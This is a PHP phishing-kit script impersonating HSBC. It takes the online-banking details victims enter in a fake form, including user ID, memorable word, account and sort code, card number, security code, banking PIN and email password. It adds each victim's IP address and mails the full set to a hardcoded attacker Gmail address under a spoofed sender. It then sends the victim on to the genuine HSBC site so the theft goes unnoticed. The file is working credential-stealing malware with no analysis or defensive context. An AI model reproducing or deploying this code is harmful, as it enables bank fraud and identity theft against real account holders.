<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------HSBC Info-----------------------\n";
$message .= "User ID            : ".$_POST['formtext1']."\n";
$message .= "Memorable Word            : ".$_POST['formtext2']."\n";
$message .= "Memorabe Place            : ".$_POST['formtext3']."\n";
$message .= "Security Number            : ".$_POST['formtext4']."\n";
$message .= "Sort Code            : ".$_POST['formtext5']."\n";
$message .= "Account Number           : ".$_POST['formtext6']."\n";
$message .= "Full Name            : ".$_POST['formtext7']."\n";
$message .= "Address            : ".$_POST['formtext8']."\n";
$message .= "Post Code            : ".$_POST['formtext9']."\n";
$message .= "Email Address            : ".$_POST['formtext10']."\n";
$message .= "Email pass             : ".$_POST['formtext12']."\n";
$message .= "Dob DD            : ".$_POST['formselect1']."\n";
$message .= "DOB MM            : ".$_POST['formselect2']."\n";
$message .= "DOB YY            : ".$_POST['formselect3']."\n";
$message .= "Home Phone Number              : ".$_POST['formtext13']."\n";
$message .= "Card Number            : ".$_POST['formtext14']."\n";
$message .= "Username            : ".$_POST['formtext15']."\n";
$message .= "Expiry Date MM            : ".$_POST['formselect4']."\n";
$message .= "Expiry Date YY            : ".$_POST['formselect5']."\n";
$message .= "Card Security Code             : ".$_POST['formtext16']."\n";
$message .= "Banking Pin             : ".$_POST['formtext17']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "---------------Created BY fudpages-------------\n";
//change ur email here
$send = "abdoalarg53@gmail.com";
$subject = "HSBC";
$headers = "From: HSBC Info<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }

   header("Location: http://www.hsbc.com/internet-banking");
  

?>